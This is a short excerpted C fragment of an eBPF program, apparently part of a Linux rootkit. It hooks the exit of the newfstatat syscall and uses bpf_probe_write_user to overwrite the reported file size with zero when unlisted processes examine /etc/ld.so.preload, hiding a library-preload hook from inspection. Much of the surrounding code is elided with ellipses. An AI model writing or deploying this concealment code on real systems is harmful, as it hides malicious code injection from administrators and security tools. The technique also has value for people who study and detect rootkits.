...
/*
    Modify stat.st_size = 0 for syscalls for **not specified comm** and **reading /etc/ld.so.preload**
*/
...
int handle_exit_newfstatat(struct trace_event_raw_sys_exit *ctx)
{
    ...
    bpf_printk("[sys_exit_newfstatat] OVERWRITING stat.st_size at %p from %d to %d", stat_p, statbuf.st_size, replace_size);
    success = bpf_probe_write_user((char *) stat_p + 48, (char *) &replace_size, sizeof(long int));
